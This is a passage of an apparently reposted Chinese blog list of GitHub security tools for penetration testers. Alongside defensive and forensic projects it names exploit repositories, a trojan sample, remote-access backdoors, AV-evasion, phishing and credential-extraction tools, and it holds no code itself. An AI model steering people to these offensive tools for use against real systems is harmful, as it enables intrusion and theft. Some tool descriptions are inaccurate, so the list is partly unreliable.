title="0x06 Fuzz"></a>0x06 Fuzz</h1><p>Web向Fuzz工具</p><p><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>HTTP暴力破解，撞库攻击脚本</p><p><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a></p><h1 id="0x07-漏洞利用及攻击框架"><a href="#0x07-漏洞利用及攻击框架" class="headerlink" title="0x07 漏洞利用及攻击框架"></a>0x07 漏洞利用及攻击框架</h1><p>msf框架：</p><p><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework</a></p><p>pocsscan攻击框架：</p><p><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a></p><p>Pocsuite攻击框架:</p><p><a href="https://github.com/knownsec/Pocsuite" target="_blank" rel="noopener">https://github.com/knownsec/Pocsuite</a></p><p>Beebeeto攻击框架：</p><p><a href="https://github.com/n0tr00t/Beebeeto-framework" target="_blank" rel="noopener">https://github.com/n0tr00t/Beebeeto-framework</a></p><h1 id="0x08-漏洞POC-amp-EXP"><a href="#0x08-漏洞POC-amp-EXP" class="headerlink" title="0x08 漏洞POC&amp;EXP"></a>0x08 漏洞POC&amp;EXP</h1><p>ExploitDB官方git版本:</p><p><a href="https://github.com/offensive-security/exploit-database" target="_blank" rel="noopener">https://github.com/offensive-security/exploit-database</a></p><p>php漏洞代码分析：</p><p><a href="https://github.com/80vul/phpcodz" target="_blank" rel="noopener">https://github.com/80vul/phpcodz</a></p><p>CVE-2016-2107:</p><p><a href="https://github.com/FiloSottile/CVE-2016-2107" target="_blank" rel="noopener">https://github.com/FiloSottile/CVE-2016-2107</a></p><p>CVE-2015-7547 POC：</p><p><a href="https://github.com/fjserna/CVE-2015-7547" target="_blank" rel="noopener">https://github.com/fjserna/CVE-2015-7547</a></p><p>JAVA反序列化POC生成工具:</p><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><p>JAVA反序列化EXP:</p><p><a href="https://github.com/foxglovesec/JavaUnserializeExploits" target="_blank" rel="noopener">https://github.com/foxglovesec/JavaUnserializeExploits</a></p><p>Jenkins CommonCollections EXP:</p><p><a href="https://github.com/CaledoniaProject/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/CaledoniaProject/jenkins-cli-exploit</a></p><p>CVE-2015-2426 EXP (windows内核提权):</p><p><a href="https://github.com/vlad902/hacking-team-windows-kernel-lpe" target="_blank" rel="noopener">https://github.com/vlad902/hacking-team-windows-kernel-lpe</a></p><p>use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示):</p><p><a href="https://github.com/hxer/vulnapp" target="_blank" rel="noopener">https://github.com/hxer/vulnapp</a></p><p>php7缓存覆写漏洞Demo及相关工具:</p><p><a href="http://https//github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>XcodeGhost木马样本:</p><p><a href="https://github.com/XcodeGhostSource/XcodeGhost" target="_blank" rel="noopener">https://github.com/XcodeGhostSource/XcodeGhost</a></p><h1 id="0x09-中间人攻击及钓鱼"><a href="#0x09-中间人攻击及钓鱼" class="headerlink" title="0x09 中间人攻击及钓鱼"></a>0x09 中间人攻击及钓鱼</h1><p>中间人攻击框架:</p><p><a href="https://github.com/secretsquirrel/the-backdoor-factory" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory</a></p><p><a href="https://github.com/secretsquirrel/BDFProxy" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy</a></p><p><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/MITMf</a></p><p>Inject code, jam wifi, and spy on wifi users:</p><p><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a></p><p>中间人代理工具:</p><p><a href="https://github.com/intrepidusgroup/mallory" target="_blank" rel="noopener">https://github.com/intrepidusgroup/mallory</a></p><p>wifi钓鱼:</p><p><a href="https://github.com/sophron/wifiphisher" target="_blank" rel="noopener">https://github.com/sophron/wifiphisher</a></p><h1 id="0x10-密码破解"><a href="#0x10-密码破解" class="headerlink" title="0x10 密码破解"></a>0x10 密码破解</h1><p>密码破解工具:</p><p><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器:</p><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h1 id="0x11-二进制及代码分析工具"><a href="#0x11-二进制及代码分析工具" class="headerlink" title="0x11 二进制及代码分析工具"></a>0x11 二进制及代码分析工具</h1><p>二进制分析工具</p><p><a href="https://github.com/devttys0/binwalk" target="_blank" rel="noopener">https://github.com/devttys0/binwalk</a></p><p>系统扫描器</p><p><a href="https://github.com/quarkslab/binmap" target="_blank" rel="noopener">https://github.com/quarkslab/binmap</a></p><p>rp:</p><p><a href="https://github.com/0vercl0k/rp" target="_blank" rel="noopener">https://github.com/0vercl0k/rp</a></p><p>Windows Exploit Development工具</p><p><a href="https://github.com/lillypad/badger" target="_blank" rel="noopener">https://github.com/lillypad/badger</a></p><h1 id="0x12-二进制静态分析工具（python）"><a href="#0x12-二进制静态分析工具（python）" class="headerlink" title="0x12 二进制静态分析工具（python）"></a>0x12 二进制静态分析工具（python）</h1><p><a href="https://github.com/bdcht/amoco" target="_blank" rel="noopener">https://github.com/bdcht/amoco</a></p><p>Python Exploit Development Assistance for GDB:</p><p><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>对BillGates Linux Botnet系木马活动的监控工具</p><p><a href="https://github.com/ValdikSS/billgates-botnet-tracker" target="_blank" rel="noopener">https://github.com/ValdikSS/billgates-botnet-tracker</a></p><p>木马配置参数提取工具:</p><p><a href="https://github.com/kevthehermit/RATDecoders" target="_blank" rel="noopener">https://github.com/kevthehermit/RATDecoders</a></p><p>Shellphish编写的二进制分析工具（CTF向）:</p><p><a href="https://github.com/angr/angr" target="_blank" rel="noopener">https://github.com/angr/angr</a></p><p>针对python的静态代码分析工具:</p><p><a href="https://github.com/yinwang0/pysonar2" target="_blank" rel="noopener">https://github.com/yinwang0/pysonar2</a></p><p>一个自动化的脚本（shell）分析工具，用来给出警告和建议:</p><p><a href="https://github.com/koalaman/shellcheck" target="_blank" rel="noopener">https://github.com/koalaman/shellcheck</a></p><p>基于AST变换的简易Javascript反混淆辅助工具:</p><p><a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="noopener">https://github.com/ChiChou/etacsufbo</a></p><h1 id="0x13-EXP编写框架及工具"><a href="#0x13-EXP编写框架及工具" class="headerlink" title="0x13 EXP编写框架及工具"></a>0x13 EXP编写框架及工具</h1><p>二进制EXP编写工具:</p><p><a href="https://github.com/t00sh/rop-tool" target="_blank" rel="noopener">https://github.com/t00sh/rop-tool</a></p><p>CTF Pwn 类题目脚本编写框架:</p><p><a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener">https://github.com/Gallopsled/pwntools</a></p><p>an easy-to-use io library for pwning development:</p><p><a href="https://github.com/zTrix/zio" target="_blank" rel="noopener">https://github.com/zTrix/zio</a></p><p>跨平台注入工具:</p><p><a href="https://github.com/frida/frida" target="_blank" rel="noopener">https://github.com/frida/frida</a></p><p>哈希长度扩展攻击EXP：</p><p><a href="https://github.com/citronneur/rdpy" target="_blank" rel="noopener">https://github.com/citronneur/rdpy</a></p><h1 id="0x14-隐写"><a href="#0x14-隐写" class="headerlink" title="0x14 隐写"></a>0x14 隐写</h1><p>隐写检测工具</p><p><a href="https://github.com/abeluck/stegdetect" target="_blank" rel="noopener">https://github.com/abeluck/stegdetect</a></p><h1 id="0x15-各类安全资料"><a href="#0x15-各类安全资料" class="headerlink" title="0x15 各类安全资料"></a>0x15 各类安全资料</h1><p>data_hacking合集:</p><p><a href="https://github.com/ClickSecurity/data_hacking" target="_blank" rel="noopener">https://github.com/ClickSecurity/data_hacking</a></p><p>mobile-security-wiki:</p><p><a href="https://github.com/exploitprotocol/mobile-security-wiki" target="_blank" rel="noopener">https://github.com/exploitprotocol/mobile-security-wiki</a></p><p>书籍《reverse-engineering-for-beginners》:</p><p><a href="https://github.com/veficos/reverse-engineering-for-beginners" target="_blank" rel="noopener">https://github.com/veficos/reverse-engineering-for-beginners</a></p><p>一些信息安全标准及设备配置:</p><p><a href="https://github.com/luyg24/IT_security" target="_blank" rel="noopener">https://github.com/luyg24/IT_security</a></p><p>APT相关笔记:</p><p><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a></p><p>Kcon资料:</p><p><a href="https://github.com/knownsec/KCon" target="_blank" rel="noopener">https://github.com/knownsec/KCon</a></p><p>《DO NOT FUCK WITH A HACKER》:</p><p><a href="https://github.com/citypw/DNFWAH" target="_blank" rel="noopener">https://github.com/citypw/DNFWAH</a></p><p>各类安全脑洞图：</p><p><a href="https://github.com/phith0n/Mind-Map" target="_blank" rel="noopener">https://github.com/phith0n/Mind-Map</a></p><p>信息安全流程图：</p><p><a href="https://github.com/SecWiki/sec-chart/" target="_blank" rel="noopener">https://github.com/SecWiki/sec-chart/ tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428</a></p><h1 id="0x16-各类CTF资源"><a href="#0x16-各类CTF资源" class="headerlink" title="0x16 各类CTF资源"></a>0x16 各类CTF资源</h1><p>近年ctf writeup大全:</p><p><a href="https://github.com/ctfs/write-ups-2016" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2016</a></p><p><a href="https://github.com/ctfs/write-ups-2015" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015</a></p><p><a href="https://github.com/ctfs/write-ups-2014" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2014</a></p><p>fbctf竞赛平台Demo:</p><p><a href="https://github.com/facebook/fbctf" target="_blank" rel="noopener">https://github.com/facebook/fbctf</a></p><p>ctf Resources:</p><p><a href="https://github.com/ctfs/resources" target="_blank" rel="noopener">https://github.com/ctfs/resources</a></p><p>ctf及黑客资源合集:</p><p><a href="https://github.com/bt3gl/My-Gray-Hacker-Resources" target="_blank" rel="noopener">https://github.com/bt3gl/My-Gray-Hacker-Resources</a></p><p>ctf和安全工具大合集:</p><p><a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a></p><p>ctf向 python工具包</p><p><a href="https://github.com/P1kachu/v0lt" target="_blank" rel="noopener">https://github.com/P1kachu/v0lt</a></p><h1 id="0x17-各类编程资源"><a href="#0x17-各类编程资源" class="headerlink" title="0x17 各类编程资源"></a>0x17 各类编程资源</h1><p>大礼包（什么都有）:</p><p><a href="https://github.com/bayandin/awesome-awesomeness" target="_blank" rel="noopener">https://github.com/bayandin/awesome-awesomeness</a></p><p>bash-handbook:</p><p><a href="https://github.com/denysdovhan/bash-handbook" target="_blank" rel="noopener">https://github.com/denysdovhan/bash-handbook</a></p><p>python资源大全:</p><p><a href="https://github.com/jobbole/awesome-python-cn" target="_blank" rel="noopener">https://github.com/jobbole/awesome-python-cn</a></p><p>git学习资料:</p><p><a href="https://github.com/xirong/my-git" target="_blank" rel="noopener">https://github.com/xirong/my-git</a></p><p>安卓开源代码解析</p><p><a href="https://github.com/android-cn/android-open-project" target="_blank" rel="noopener">https://github.com/android-cn/android-open-project</a></p><p>python框架，库，资源大合集:</p><p><a href="https://github.com/vinta/awesome-python" target="_blank" rel="noopener">https://github.com/vinta/awesome-python</a></p><p>JS 正则表达式库（用于简化构造复杂的JS正则表达式）:</p><p><a href="https://github.com/VerbalExpressions/JSVerbalExpressions" target="_blank" rel="noopener">https://github.com/VerbalExpressions/JSVerbalExpressions</a></p><h1 id="0x18-Python"><a href="#0x18-Python" class="headerlink" title="0x18 Python"></a>0x18 Python</h1><p>python 正则表达式库（用于简化构造复杂的python正则表达式）:</p><p><a href="https://github.com/VerbalExpressions/" target="_blank" rel="noopener">https://github.com/VerbalExpressions/</a></p><p>python任务管理以及命令执行库:</p><p><a href="https://github.com/pyinvoke/invoke" target="_blank" rel="noopener">https://github.com/pyinvoke/invoke</a></p><p>python exe打包库:</p><p><a href="https://github.com/pyinstaller/pyinstaller" target="_blank" rel="noopener">https://github.com/pyinstaller/pyinstaller</a></p><p>Veil-Evasion免杀项目：</p><p><a href="https://github.com/Veil-Framework/Veil-Evasion" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Evasion</a></p><p>py3 爬虫框架:</p><p><a href="https://github.com/orf/cyborg" target="_blank" rel="noopener">https://github.com/orf/cyborg</a></p><p>一个提供底层接口数据包编程和网络协议支持的python库:</p><p><a href="https://github.com/CoreSecurity/impacket" target="_blank" rel="noopener">https://github.com/CoreSecurity/impacket</a></p><p>python requests 库:</p><p><a href="https://github.com/kennethreitz/requests" target="_blank" rel="noopener">https://github.com/kennethreitz/requests</a></p><p>python 实用工具合集:</p><p><a href="https://github.com/mahmoud/boltons" target="_blank" rel="noopener">https://github.com/mahmoud/boltons</a></p><p>python爬虫系统:</p><p><a href="https://github.com/binux/pyspider" target="_blank" rel="noopener">https://github.com/binux/pyspider</a></p><h1 id="0x19-科学上网"><a href="#0x19-科学上网" class="headerlink" title="0x19 科学上网"></a>0x19 科学上网</h1><p>科学上网工具</p><p><a href="https://github.com/XX-net/XX-Net" target="_blank" rel="noopener">https://github.com/XX-net/XX-Net</a></p><h1 id="0x20-福利"><a href="#0x20-福利" class="headerlink" title="0x20 福利"></a>0x20 福利</h1><p>微信自动抢红包动态库</p><p><a href="https://github.com/east520/AutoGetRedEnv" target="_blank" rel="noopener">https://github.com/east520/AutoGetRedEnv</a></p><p>微信抢红包插件（安卓版）</p><p><a href="https://github.com/geeeeeeeeek/WeChatLuckyMoney" target="_blank" rel="noopener">https://github.com/geeeeeeeeek/WeChatLuckyMoney</a></p><p>hardsed神器:</p><p><a href="https://github.com/yangyangwithgnu/hardseed" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/hardseed</a></p><h1 id="0x21-甲方安全工程师生存指南"><a href="#0x21-甲方安全工程师生存指南" class="headerlink" title="0x21 甲方安全工程师生存指南"></a>0x21 甲方安全工程师生存指南</h1><p>web索引及日志搜索工具：</p><p><a href="https://github.com/thomaspatzke/WASE" target="_blank" rel="noopener">https://github.com/thomaspatzke/WASE</a></p><p>开源日志采集器：</p><p><a href="https://github.com/wgliang/logcool" target="_blank" rel="noopener">https://github.com/wgliang/logcool</a></p><p>扫描CS结构的web debuger</p><p><a href="https://github.com/Kozea/wdb" target="_blank" rel="noopener">https://github.com/Kozea/wdb</a></p><p>恢复sqlite数据库删除注册信息：</p><p><a href="https://github.com/aramosf/recoversqlite/" target="_blank" rel="noopener">https://github.com/aramosf/recoversqlite/</a></p><p>gps欺骗检测工具:</p><p><a href="https://github.com/zxsecurity/gpsnitch" target="_blank" rel="noopener">https://github.com/zxsecurity/gpsnitch</a></p><p>应急处置响应框架:</p><p><a href="https://github.com/biggiesmallsAG/nightHawkResponse" target="_blank" rel="noopener">https://github.com/biggiesmallsAG/nightHawkResponse</a></p><p>web安全开发指南:</p><p><a href="https://github.com/FallibleInc/security-guide-for-developers" target="_blank" rel="noopener">https://github.com/FallibleInc/security-guide-for-developers</a></p><p>各个知名厂商漏洞测试报告模板：</p><p><a href="https://github.com/juliocesarfort/public-pentesting-reports" target="_blank" rel="noopener">https://github.com/juliocesarfort/public-pentesting-reports </a>linux下恶意代码检测包：</p><p><a href="https://github.com/rfxn/linux-malware-detect" target="_blank" rel="noopener">https://github.com/rfxn/linux-malware-detect</a></p><p>操作系统运行指标可视化框架：</p><p><a href="https://github.com/facebook/osquery" target="_blank" rel="noopener">https://github.com/facebook/osquery</a></p><p>恶意代码分析系统：</p><p><a href="https://github.com/cuckoosandbox/cuckoo" target="_blank" rel="noopener">https://github.com/cuckoosandbox/cuckoo</a></p><p>定期搜索及存储web应用：</p><p><a href="https://github.com/Netflix/Scumblr" target="_blank" rel="noopener">https://github.com/Netflix/Scumblr</a></p><p>事件响应框架：</p><p><a href="https://github.com/google/grr" target="_blank" rel="noopener">https://github.com/google/grr</a></p><p>综合主机监控检测平台：</p><p><a href="https://github.com/ossec/ossec-hids" target="_blank" rel="noopener">https://github.com/ossec/ossec-hids</a></p><p>分布式实时数字取证系统：</p><p><a href="https://github.com/mozilla/mig" target="_blank" rel="noopener">https://github.com/mozilla/mig</a></p><p>Microsoft &amp; Unix 文件系统及硬盘取证工具：</p><p><a href="https://github.com/sleuthkit/sleuthkit" target="_blank" rel="noopener">https://github.com/sleuthkit/sleuthkit</a></p><h1 id="0x22-蜜罐"><a href="#0x22-蜜罐" class="headerlink" title="0x22 蜜罐"></a>0x22 蜜罐</h1><p>SSH蜜罐：</p><p><a href="https://github.com/desaster/kippo" target="_blank" rel="noopener">https://github.com/desaster/kippo</a></p><p>蜜罐集合资源：</p><p><a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots</a></p><p>kippo进阶版蜜罐：</p><p><a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="noopener">https://github.com/micheloosterhof/cowrie</a></p><p>SMTP 蜜罐：</p><p><a href="https://github.com/awhitehatter/mailoney" target="_blank" rel="noopener">https://github.com/awhitehatter/mailoney</a></p><p>web应用程序蜜罐：</p><p><a href="https://github.com/mushorg/glastopf" target="_blank" rel="noopener">https://github.com/mushorg/glastopf</a></p><p>数据库蜜罐：</p><p><a href="https://github.com/jordan-wright/elastichoney" target="_blank" rel="noopener">https://github.com/jordan-wright/elastichoney</a></p><p>web蜜罐：</p><p><a href="https://github.com/atiger77/Dionaea" target="_blank" rel="noopener">https://github.com/atiger77/Dionaea</a></p><h1 id="0x23-远控"><a href="#0x23-远控" class="headerlink" title="0x23 远控"></a>0x23 远控</h1><p>用gmail充当C&amp;C服务器的后门</p><p><a href="https://github.com/byt3bl33d3r/gcat" target="_blank" rel="noopener">https://github.com/byt3bl33d3r/gcat</a></p><p>开源的远控：</p><p><a href="https://github.com/UbbeLoL/uRAT" target="_blank" rel="noopener">https://github.com/UbbeLoL/uRAT</a></p><p>c#远控：</p><p><a href="https://github.com/hussein-aitlahcen/BlackHole" target="_blank" rel="noopener">https://github.com/hussein-aitlahcen/BlackHole</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;我们咋进行渗透测试的过程中，可能会用到很多的开源测试工具，但是一个个去寻找太过于繁琐了，索性tools论文中给我们整理好了，这里转载一下，也方便自己查看。&lt;/p&gt;
&lt;p&gt;转载链接：&lt;a href=&quot;https://www.t00ls.net/pytools.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.t00ls.net/pytools.html&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="转载" scheme="https://www.mad-coding.cn/tags/%E8%BD%AC%E8%BD%BD/"/>
    
  </entry>
  
</feed>
